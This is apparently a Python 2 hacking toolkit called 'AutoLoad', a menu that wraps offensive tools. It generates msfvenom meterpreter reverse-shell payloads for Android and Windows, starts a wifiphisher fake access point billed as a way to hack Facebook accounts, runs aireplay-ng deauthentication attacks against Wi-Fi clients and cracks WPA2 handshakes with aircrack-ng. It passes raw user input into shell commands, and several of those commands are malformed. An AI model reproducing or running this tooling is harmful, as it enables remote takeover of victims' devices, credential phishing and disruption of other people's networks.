#!/usr/bin/env python
from __future__ import print_function
from __future__ import absolute_import
import colorama
from colorama import Fore
import os
import sys
import pygeoip
import requests
import httplib
import socket
import loading
os.system('resize -s 19 92')
os.system('clear')
print(Fore.GREEN +"                        Welcome to                   |::::::Follow Me on::::::")
print(Fore.GREEN +"         _         _        _     ___            _   |"+Fore.RED +"::::::::YouTube:::::::::") 
print(Fore.GREEN +"        / \  _   _| |_ ___ | |   / _ \  __ _  __| |  |"+Fore.WHITE+"https://www.youtube.com/Majorhacker")
print(Fore.GREEN +"       / _ \| | | | __/ _ \| |  | | | |/ _` |/ _` |  |"+Fore.YELLOW +"::::::::Website:::::::::")
print(Fore.GREEN +"      / ___ \ |_| | || (_) | |__| |_| | (_| | (_| |  |"+Fore.WHITE +"http://majorhacke.blogspot.com/")
print(Fore.GREEN +"     /_/   \_\__,_|\__\___/|_____\___/ \__,_|\__,_|  |"+Fore.BLUE +"::::::::Facebook::::::::")
print(Fore.GREEN +"                Automatic Your Proccess              |"+Fore.WHITE +"http://facebook.com/majorhacke ")
print(Fore.GREEN +"                       [created by Nafis] ["+Fore.WHITE +"V1.0"+Fore.GREEN +"]     |")
print(Fore.GREEN +"====================================================================================")
#------------------------------------------------------------------------------------------------------------------------------------------------------------
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def check_internet():
    test_con="www.google.com"
    test_res="/intl/en/policies/privacy/"
    test=httplib.HTTPConnection(test_con)
    try:
        test.request("GET",test_res)
        response=test.getresponse()
    except httplib.ResponseNotReady as e:
        print("Improper Connection State")
    except socket.gaierror as e:
        print("Not Connected to the Internet")
        print("Internet Required")
        user_input=raw_input("Press Any key to Go back...")
        import Autoload
    else:
        print(Fore.GREEN +"Connected")
        
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def android():
    os.system('clear')
    print("[*]::::::Create Payload For Android::::::")
    print("")
    print("[*]Enter the IP and PORT you want to Listen on ")
    ip=raw_input("[IP:] > ")
    port=raw_input("[PORT:] > ")
    name=raw_input("[Name of the File:] > ")
    path=raw_input("File Save to[add '/' in the end]: ")
    print("Payload is going to Saved in " +path+name+ ".apk")
    print("[]Generating...........")
    os.system('msfvenom -p android/meterpreter/reverse_tcp --platform android LHOST=' +ip+ ' LPORT=' +port+ ' -o'+path+name+ '.apk')
    print("")
    print("Done..")
    os.system('clear')
    import Autoload
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def windows():
    os.system('clear')
    print("[*]::::::Create Payload For Windows::::::")
    print("")
    print("[*]Enter the IP and PORT you want to Listen on ")
    print("")
    ip=raw_input("[IP:] > ")
    port=raw_input("[PORT:] > ")
    name=raw_input("[Name of the File:] > ")
    path=raw_input("File Save to[add '/' in the end]: ")
    print("Payload is going to Saved in " +path+name+ ".exe")
    print("[]Generating...........")
    os.system('msfvenom -p windows/meterpreter/reverse_tcp --platform windows LHOST=' +ip+ ' LPORT=' +port+ ' -o' +path+name+'.exe')
    print("")
    print("Done..")
    os.system('clear')
    import Autoload
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def helppp():
    os.system('clear')
    print("")
    print("[..Example..]")
    print("")
    print("IP: 192.168.43.1")
    print("PORT: 4444")
    print("Name of the File: payload")
    print("File Save to[add '/' in the end]: /root/payload/")
    print("")
    user_input=raw_input("Press Any key to Go back...")
    os.system('clear')
    import Autoload
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def fakeap():
    os.system('clear')
    print("[*]::::::Create a Fake AP to Hack Facebook Account::::::")
    print("")
    ap=raw_input("[Enter the name of the AP:] > ")
    print("[]Creating............")
    os.system('xterm -e wifiphisher  --essid' +ap+ '-p oauth-login; exec bash')
    print("Done..")
    os.system('clear')
    import Autoload
#-------------------------------------------------------------------------------------------------------------------------------------------------------------
def deauth():
    os.system('clear')
    def single():
        apmac=raw_input("[Enter the AP Essid(MAC):] > ")
        cmac=raw_input("[Enter the Client's MAC:] > ")
        wificard=raw_input("[Name of the WiFi card name in moniter mode:] > ")
        os.system('xterm -e aireplay-ng --deauth -a' +apmac+ '-c' +cmac+ wificard)
    def allcl():
        apmac=raw_input("[Enter the AP Essid(MAC):] > ")
        wificard=raw_input("[Name of the WiFi card name in moniter mode:] > ")
        os.system('xterm -e aireplay-ng --deauth -a' +apmac+ wificard)   
    print("[*]:::::: Disconnect Client From there AP ::::::")
    print("")
    print("1.) Disconnect Single Client[Effective/Recommanded]")
    print("2.) Disconnect All Client[Less Effective]")
    print("3.) Scan ")
    print("4.) Enable Moniter Mode")
    print("5.) Disable Moniter Mode")
    print("6.) Back")
    print("")
    user=input(Fore.BLUE +"[autoload:] > ")
    if user == 1:
        single()
    elif user == 2:
        allcl()
    elif user == 3:
        os.system('clear')
        os.system('xterm -e airodump-ng wlan0mon &')
        deauth()
    elif user == 4:
        os.system('airmon-ng start wlan0')
        print("Done..")
        deauth()
    elif user == 5:
        os.system('airmon-ng stop wlan0mon')
        print("Done..")
        deauth()
    elif user == 6:
        os.system('clear')
        import Autoload
    else:
       print("Wrong Choice")
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def geolocate():
    os.system('clear')
    check_internet()
    print("[*]::::::GeoLocate An IP Address::::::")
    print("")
    x = raw_input('[Input IP :] > ')
    gip = pygeoip.GeoIP('/usr/local/bin/GeoLiteCity.dat')
    rec = gip.record_by_addr(x)
    for val in rec.items():
        print ("%s: %s" %(val))
        print("")
    user_input=raw_input("Press Any key to Go back...")
    os.system('clear')
    import Autoload
#------------------------------------------------------------------------------------------------------------------------------------------------------------    
def check_ip():
    os.system('clear')
    check_internet()
    print("[]Please wait....")
    print("Your Public IP is: ")
    public_ip=os.system('curl -s ipinfo.io/ip')
    print("")
    user_input=raw_input("Press Any key to Go back...")
    import Autoload
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def brute_force():
    os.system('clear')
    print("[*]::::::Cracking Wpa2 Handshake File using Dictinoary Attack::::::")
    print("")
    handsak=raw_input("[Select HandShake File:] > ")
    print("")
    wordlist=raw_input("[Select WordList File:] > ")
    os.system('clear')
    print("[*]Cracking...........")
    os.system('aircrack-ng ' + handsak+ ' -w ' + wordlist)
    print("")
    userif = ''
    while not(userif == 'B' or userif == 'E'):
        userif=raw_input("[Type [b] Back or [e] Exit:] > ").upper()
        if userif == 'B':
            import Autoload
        elif userif == 'E':
            print("")
            print("Thanks For Using AutoLoad")
            sys.exit()
        else:
            print(Fore.RED +"Try Again")
        
    
    
#------------------------------------------------------------------------------------------------------------------------------------------------------------        
print("")
print("|1.)"+Fore.WHITE +" Make a Android Payload "+Fore.GREEN +"|5.)"+Fore.WHITE +" GeoLocate an IP "+Fore.GREEN +     "    |11.)"+Fore.WHITE +" Help")
print(Fore.GREEN +"|2.)"+Fore.WHITE +" Make a Windows Payload "+Fore.GREEN +"|6.)"+Fore.WHITE +" View Public IP  "+Fore.GREEN + "    |22.)"+Fore.WHITE +" Update")
print(Fore.GREEN +"|3.)"+Fore.WHITE +" Create Fake AP         "+Fore.GREEN +"|7.)"+Fore.WHITE +" Crack Wpa2 HandShake"+Fore.GREEN +"|33.)"+Fore.WHITE +" Exit  ")
print(Fore.GREEN +"|4.)"+Fore.WHITE +" Deauth Attack          "+Fore.GREEN +"|                    "+Fore.GREEN +"    |      ")
print("")
while True:
    try:
        user=input(Fore.BLUE +"[autoload] > ")
        if user == 1:
            android()
        elif user == 2:
            windows()
        elif user == 11:
            helppp()
        elif user == 33:
            print("")
            print(Fore.GREEN +"Thanks for using AutoLOad")
            print("Goodbye!!")
            print(Fore.RED +"Don't Forget to Subscribe my YouTube Channel..")
            print("")
            sys.exit()
        elif user == 3:
            fakeap()
        elif user == 4:
            deauth()
        elif user == 5:
            geolocate()
        elif user == 6:
            check_ip()
        elif user == 7:
            brute_force()
        elif user == 22:
            check_internet()
            os.system('python /usr/share/updater.py')
        elif user == 'clear':
            os.system('clear')
        else:
            print(Fore.RED +"Wrong Choice")
        continue
    except KeyboardInterrupt:
        print("")
        print(Fore.GREEN +"Thanks For Using AutoLoad!")
        sys.exit()




    
                                              
